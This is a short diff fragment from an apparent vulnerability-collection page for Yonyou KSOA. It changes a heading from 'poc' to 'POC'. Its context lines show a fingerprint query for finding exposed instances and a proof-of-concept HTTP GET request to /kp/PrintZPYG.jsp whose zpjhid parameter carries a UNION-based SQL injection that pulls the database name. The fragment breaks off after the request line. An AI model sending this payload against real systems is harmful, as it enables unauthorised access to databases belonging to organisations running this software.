@@ -8,7 +8,7 @@
 app="用友-时空KSOA"
 ```
 
-## poc
+## POC
 
 ```yaml
 GET /kp/PrintZPYG.jsp?zpjhid=1%27+union+select+1,2,db_name(),4,5,6,7,8,9,10,11,12,13,14+--+ HTTP/1.1
